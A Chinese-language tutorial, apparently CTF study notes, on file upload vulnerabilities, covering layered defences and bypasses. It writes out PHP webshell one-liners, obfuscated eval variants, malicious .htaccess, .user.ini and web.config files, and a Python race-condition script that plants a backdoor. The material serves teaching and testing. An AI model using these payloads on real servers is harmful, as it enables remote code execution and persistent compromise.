# 文件上传漏洞

## 概述

文件上传漏洞属于**不安全的文件上传**（CWE-434: Unrestricted Upload of Dangerous File Type）。攻击者上传可执行文件（PHP、JSP、ASP、Python 脚本等）到服务器，如果能控制上传路径且文件可以被 Web 容器解析，则实现远程代码执行（RCE）。

成功的条件可以归纳为三点：

```
1. 绕过限制，成功将文件上传到服务器
2. 知道上传文件的存放路径
3. 上传的文件可以被 Web 容器解析执行
```

三个条件缺一不可。实际攻防中，三个条件各自对应一类绕过技术。

---

## 根本原因

文件上传漏洞存在的根本原因在于：**服务器无法区分"用户应该上传的内容"和"恶意文件"**。

开发者的防御思路是在"上传前"做检查和过滤，但防御必须覆盖所有可能绕过路径——只要有一条没覆盖到，攻击者就能利用。而攻击者只需要找到一个绕过方法。这是不对称的对抗关系。

常见的防御维度包括：
- 前端 JavaScript 限制（最弱，完全可控）
- 服务端 MIME 类型检查
- 文件扩展名黑名单/白名单
- 文件内容头检查（Magic Bytes）
- 文件内容完整性检查（二次渲染）
- 文件系统权限控制
- Web 容器解析配置

每个维度都有关键边界条件导致绕过可能。

---

## 防御层与绕过技术一览

整个文件上传漏洞的攻防可以抽象为多层防御，每层都有对应的绕过技术：

```text
客户端 JavaScript 限制                  →  Burp 直接修改请求
    │
服务端 Content-Type 检查               →  修改 MIME 字段
    │
服务端扩展名黑名单                      →  多重扩展、大小写、特殊字符截断
    │
服务端扩展名白名单                      →  配置文件上传 (.htaccess / .user.ini)
    │
服务端文件内容检查 (Magic Bytes)        →  GIF89a 伪造文件头
    │
服务端文件内容检查 (完整检测)            →  二次渲染 / 图片元数据插入
    │
服务端文件内容检查 (危险函数)            →  script 标签替代 <?php
    │
检查后删除 (Race Condition)             →  时间竞争利用
```

## 1. 客户端绕过 (Client-Side Bypass)

### 原理

前端 JavaScript 检查文件扩展名，只允许特定类型提交。这是**最外层的防御，也是最弱的**。

### 绕过方法

- 直接使用 Burp Suite 拦截上传请求，修改文件名和 Content-Type
- 或直接禁用浏览器 JavaScript

### 示例

前端限制为 `.jpg|.png|.gif`：

```
原始请求: filename="shell.php"
改为:     filename="shell.jpg"        →  绕过前端检查
   然后在 Burp 中修改请求体
最终:     filename="shell.php"        →  Burp 改为 php
```

### 意义

任何不配合服务端验证的客户端检查都可以被绕过。前端检查的唯一价值是减少无效请求对服务端的压力，而非提供安全防护。

---

## 2. MIME 类型绕过 (Content-Type Bypass)

### 原理

服务端检查 HTTP 请求中的 `Content-Type` 字段，如果不是允许的类型（如 `image/jpeg`）则拒绝。

### 绕过方法

在 Burp 中修改 `Content-Type` 请求头：

```http
Content-Type: application/x-php
    → 改为
Content-Type: image/jpeg
```

### 为什么有效

`Content-Type` 来自客户端请求，服务端信任它而不是从文件内容推导。PHP 的 `$_FILES['file']['type']` 直接取自 HTTP 包头，完全不验证文件实际内容。

---

## 3. 扩展名黑名单绕过 (Extension Blacklist Bypass)

### 原理

服务端维护一个禁止上传的扩展名列表（如 `.php`、`.asp`、`.jsp`），匹配到则拒绝。这是 CTF 中出现频率最高的限制方式。

### 3.1 多重扩展名

```text
shell.php.jpg  →  如果服务器按最后一个扩展名判断则为图片
               但如果 Apache 配置了 AddType application/x-httpd-php .php
               或者 PHP 配置使得文件可以被多重扩展名解析
               实际上 Apache 默认按最后一个扩展名决定 MIME 类型
```

这个通常用于 Apache 的 `AddHandler` 或 `AddType` 配置不当的场景，不是通用绕过法。

更准确的场景：如果后端黑名单只检查了 `.php`，但放了 `.php.jpg` 过去，而 Apache 的 `mod_mime` 配置不当的情况下，服务器可能仍会以 PHP 解析。

### 3.2 大小写绕过

```text
shell.php  →  被黑名单拦截
shell.PhP  →  如果黑名单只写了小写 "php"，则绕过
shell.pHp  →  同理

PHP 在 Windows 系统上文件系统不区分大小写，
Linux 默认区分但黑名单匹配时可能未做大小写归一化。
```

### 3.3 点绕过 / 点空额点绕过

```text
Windows 系统特性：文件名末尾的 . 和 空格 会被自动删除
  shell.php.   →  Windows 自动变为 shell.php
  shell.php. .  →  Windows 自动变为 shell.php
  shell.php.  →  上传时文件名为 "shell.php."，保存后被去掉尾部的点

Linux 系统不自动截断，但如果服务端代码做了 trim/过滤
也可能出现类似效果。
```

### 3.4 超长文件名截断

```text
Windows 文件系统路径长度限制：
  - NTFS 路径最大 255 个字符
  - 超出长度的部分被静默截断

攻击手法：
  shell.php + 大量重复字符(如 AAAA...) + .jpg
  截断后保留 shell.php，尾部被丢弃

  例如: shell.phpAAAAAAAAAAAAA...(250个A...)AAAA.jpg
  → 保存时截断为: shell.phpAAAA...
```

### 3.5 Windows 备用数据流 (ADS)

```text
shell.php::$DATA  →  NTFS 备用数据流标记
  PHP 在 Windows 上处理文件时，::$DATA 会被忽略
  最终写入文件为: shell.php
  关键服务端是否过滤了 ::$DATA 字符串
```

### 3.6 空字节/Null Byte 截断 (PHP < 5.3.4)

```text
shell.php%00.jpg  →  某些版本中，C 层处理路径时空字节截断
  实际处理为: shell.php
  .jpg 部分被丢弃

PHP 5.3.4 以后修复了此问题，文件名中的 null byte 不再被截断。
```

### 3.7 解析差异 (Content-Disposition 文件名注入)

```text
Content-Disposition: form-data; name="file"; filename="shell.php"
  改为利用 %0d%0a 或其他字符混淆
```

以上各种绕过方法的共同思路是：**服务端黑名单里写的是严格匹配的 `php`，但用户输入在经过文件系统/PHP处理时的行为与黑名单匹配时的行为存在差异**。

> 参考 wordlist：[[../../wordlists/upload-extension-blacklist-bypass.txt|upload-extension-blacklist-bypass.txt]]

## 4. 配置文件上传绕过 (Configuration File Upload)

当扩展名白名单（只允许 `.jpg` `.png` `.gif`）时，无法直接上传 `.php`。此时如果允许上传配置文件，可以**间接控制服务器的解析行为**。

### 4.1 .htaccess (Apache)

```apache
# 将 .jpg 文件当作 PHP 解析
AddType application/x-httpd-php .jpg

# 或者指定某个文件用 PHP 解析
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

# 或者直接让目录下的所有文件都可以作为 PHP 解析
AddHandler php5-script .jpg
```

**前提条件**：
- Apache Web 服务器
- `AllowOverride` 允许 `.htaccess` 生效
- 可上传 `.htaccess` 文件（常常被加入黑名单）

绕过 `.htaccess` 被黑名单拦截的思路和上面一样：`.Htaccess`（大小写）、`.htaccess.`（Windows 尾部点）、`htaccess.txt` 上传后 rename（如有文件重命名功能）。

### 4.2 .user.ini (PHP)

```ini
; 自动在 PHP 文件前/后追加指定文件的内容
auto_prepend_file = shell.jpg
auto_append_file = shell.jpg
```

**工作原理**：

PHP 的 `auto_prepend_file` / `auto_append_file` 配置类似于在所有 PHP 脚本执行前/后自动 include 一个文件。上传一个包含 PHP 代码的 `.jpg` 文件，再上传 `.user.ini` 指定该 jpg 文件，然后访问任意 PHP 页面即可触发。

**前提条件**：
- PHP 以 `CGI/FastCGI/FPM` 模式运行（非 `mod_php`）
- `.user.ini` 是 PHP 的"目录级配置文件"，类似 Apache 的 `.htaccess`，可以覆盖 `php.ini` 中的设置
- PHP 7.0+ 仍支持 `.user.ini`

`user.ini` 与 `htaccess` 的对比：

| 特性 | .htaccess | .user.ini |
|------|-----------|-----------|
| 服务器 | Apache | PHP (CGI/FPM/FastCGI) |
| 作用域 | Apache 配置 | PHP 配置 |
| 生效条件 | AllowOverride 开启 | PHP 以 CGI/FPM 运行 |
| 关键指令 | AddType / SetHandler | auto_prepend_file / auto_append_file |
| PHP 7.0+ | — | 仍支持 |

### 4.3 web.config (IIS/ASP.NET)

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" 
           resourceType="File" requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

上传 `web.config` 让 IIS 将 `.jpg` 交给 PHP 解析。

## 5. 文件内容检查绕过

### 5.1 Magic Bytes 绕过

在文件头部添加图片文件头字节，让文件检测函数误判为图片：

```text
GIF89a = 47 49 46 38 39 61  →  GIF
\xFF\xD8\xFF\xE0            →  JPEG
\x89PNG                      →  PNG
```

```php
# 在 PHP 代码前加上 GIF89a 头
GIF89a
<?php system($_GET['cmd']); ?>
```

许多检查只读取文件前几个字节，看到 GIF89a 即认为是图片。这种检查通常由 `getimagesize()` 或 `finfo_file()` 执行，前者只验证文件头。

### 5.2 `<script language="php">` 绕过

当检查只匹配 `<?php` 关键词时，可以用 PHP 替代标签：

```php
# 检查：文件内容包含 "<?php" 则拒绝
# 绕过：使用 script 标签
<script language="php">system($_GET['cmd']);</script>
```

**技术背景**：

PHP 支持四种形式的开始/结束标记：

| 标记形式 | PHP 5.x | PHP 7.0+ |
|---------|---------|----------|
| `<?php ?>` | 支持 | 支持 |
| `<? ?>`（short_open_tag） | 默认支持 | 依旧支持 |
| `<?= ?>`（短 echo） | PHP 5.4+ 始终可用 | 始终可用 |
| `<script language="php">` | 支持 | **移除** |
| `<% %>`（ASP 风格） | 支持 | **移出** (5.4 后) |

因此 `<script language="php">` 绕过**仅在 PHP 7.0 以下版本有效**。CTF 中使用时需注意服务器 PHP 版本。

### 5.3 图片二次渲染绕过 (Image二次渲染)

当服务端用 `imagecreatefromjpeg()` 等函数对上传图片进行重新取样生成新图片时，会在新图片中去除嵌入的后门。此时**简单的文件头添加不够**，需要在二次渲染后还能找到可插入后门的位置。

**二次渲染的绕过方法**：

```
1. 上传原始图片
2. 下载二次渲染后的图片
3. 用比较工具（如 Beyond Compare、010 Editor、StegSolve）
   找出原图和渲染后图中完全相同的字节区域
4. 在这些未修改的区域中插入一句话木马
   (确保被修改的字节不是渲染算法的关键输入)
5. 再次上传修改后的图片
6. 验证后门依然存活
```

**原理**：`imagecreatefromjpeg()` / `imagecreatefrompng()` / `imagecreatefromgif()` 在重新采样时会保留图像的视觉内容，但并不是**逐字节**保留。在保留的视觉内容区域，选择不破坏图像目视效果的字节插入代码（如图片注释块、EXIF 数据、或非关键像素的低位字节）。

### 5.4 EXIF 元数据插入

JPEG 图片的 EXIF 段（Exchangeable Image File Format）可以嵌入文本信息，且不影响图像显示。

```bash
# 使用 exiftool 将 PHP 代码写入 EXIF 注释
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

生成的图片仍然是合法 JPEG，`getimagesize()` 通过。之后配合文件包含漏洞（LFI）执行该图片中的 PHP 代码。

### 5.5 图像颜色信息隐藏

将 PHP 代码隐藏在图片的像素数组中，使用最低有效位（LSB）或图片调色板中的冗余数据。通常需要配合文件包含来让 PHP 解析图片中的代码。

附注：当你发现一个上传点支持图片上传且确认了保存路径，但实际上传的图片不直接以 PHP 解析时——尝试寻找这个站点的 LFI 漏洞。这是文件上传+LFI 的经典组合链。

## 6. 条件竞争绕过 (Race Condition)

### 原理

服务端逻辑顺序是：

```text
[1] 保存上传文件到临时目录  →  [2] 检查文件是否包含危险内容  →  [3] 是则删除
                            ↑ 存在时间窗口 ↑
```

如果在步骤 1 和步骤 3 之间（文件已经写入磁盘但尚未被删除），攻击者持续发送请求访问该文件，利用这个极短的时间窗口执行文件中的代码。

### 攻击步骤

```text
攻击者:  持续上传包含后门的文件（如 shell.php）
         持续发送请求访问该文件（如 GET /uploads/shell.php）
         
服务器:  上传到达 → 保存到 uploads/shell.php
         检查发现危险内容 → 删除 uploads/shell.php
         
关键: 在"保存"和"删除"之间，shell.php 曾短暂存在于磁盘上。
     如果此时攻击者的访问请求恰好到达，shell.php 被执行。
     执行的任务通常是创建一个永久的后门文件。
```

### 竞争 exploit 示例骨架

```python
import threading
import requests

target = "http://target.com/upload.php"
shell_url = "http://target.com/uploads/shell.php"

def uploader():
    while True:
        files = {"file": ("shell.php", "<?php file_put_contents('backdoor.php','<?php system($_GET[1]);?>');?>")}
        requests.post(target, files=files)

def accessor():
    while True:
        r = requests.get(shell_url)
        if r.status_code == 200:
            print("Webshell created!")
            break

t1 = threading.Thread(target=uploader)
t2 = threading.Thread(target=accessor)
t1.start()
t2.start()
```

### 关键变量

- **时间窗口大小**：取决于文件大小、磁盘 I/O、检查逻辑复杂度。大文件有更多时间。
- **请求频率**：上传频率和访问频率越高，同时命中的概率越大。
- **检查实现**：是保存到硬盘后检查，还是先写入临时目录再移动（原子操作）。

## 7. 语句马变形绕过 (WAF 绕过)

如果黑名单含 `eval`、`system`、`exec`、`assert`、`$_GET`、`$_POST` 等关键字：

```php
// 字符串拼接绕过关键字检测
${"$_s"."ESSION"}  // 绕过 $_SESSION

// 使用 base64 编码
<?php eval(base64_decode('ZWNobyAnSGVsbG8nOw==')); ?>

// 使用变量函数
<?php $a = "system"; $a($_GET['cmd']); ?>

// 使用回调函数
<?php array_map(function($v){system($v);}, [$_GET['cmd']]); ?>

// 使用反引号执行
<?php $cmd = $_GET['cmd']; echo `$cmd`; ?>
```

CTF 中常见一句话变形集：

```php
<?php eval($_POST[1]);?>           // 最基础
<?php assert($_POST[1]);?>         // PHP 7 中 assert() 不再是函数，此方式失效
<?php @eval($_POST[1]);?>          // @ 抑制错误信息
<?=$_POST[1]($_POST[2]);?>        // 变量函数: ?1=system&2=id
<?php call_user_func($_POST[1]);?>  // 回调
<?php $a=$_POST[1];$a();?>        // 可变函数（PHP 7+ 可用）
<?php ($_=@$_GET[1]).@$_($_POST[2]);?> // 精简版
```

## 知识图谱

文件上传漏洞不是孤立的，它经常与其他漏洞类型形成攻击链：

| 组合 | 说明 |
|------|------|
| 上传 + LFI | 上传图片马，通过 LFI 漏洞 include 执行。最常见的长尾组合 |
| 上传 + SQLi | 上传 Webshell 后读取数据库，或利用 SQL 写入 Webshell（INTO OUTFILE） |
| 上传 + SSRF | 在内网管理端上传文件（如 crontab、authorized_keys）实现 RCE |
| 上传 + RCE（命令注入） | 利用命令注入写文件到 Web 目录，非直接上传 |

## 常见误解纠正

- **误解：php.jpg 作为文件名就能被 PHP 解析。**
  事实：Apache 默认只按最后一个扩展名决定 MIME 类型，`.php.jpg` 默认是 image/jpeg，不会被执行。除非有 `AddHandler` 配置。

- **误解：Content-Type 设置为 image/jpeg 就能保证文件是图片。**
  事实：Content-Type 来自客户端请求，完全可控。真正的图片检查需要验证文件内容（如 `getimagesize()` 或 `finfo_file()`）。

- **误解：检查了图片头（GIF89a）就一定是安全图片。**
  事实：GIF89a 只是文件的前 6 个字节，后续可以跟上任意 PHP 代码。只有二次渲染或完整性校验才能有效消除嵌入的代码。

- **误解：Linux 上也有文件名尾部点截断问题。**
  事实：尾部点和空格截断是 Windows 文件系统的特性，Linux 上不存在。Linux 上可以写入名为 `shell.php.` 的文件，但需要 APC 或类似方式解析。

- **误解：条件竞争需要高频率的请求。**
  事实：时间窗口可大可小，取决于文件大小和检查逻辑。大文件（如 10MB+ jpg）的写入耗时更长，时间窗口更明显，不需要极高的请求频率也能命中。

---

## 检测方法

- **黑盒**：寻找文件上传表单（multipart/form-data），尝试上述所有绕过方法
- **白盒**：寻找 `$_FILES`、`move_uploaded_file()`、`file_put_contents()`、`fwrite()` 等文件写入函数，追踪文件名的来源和过滤路径
- **获取路径**：返回包中可能包含文件 URL、错误信息中显示上传路径、结合 LFI 确认文件位置
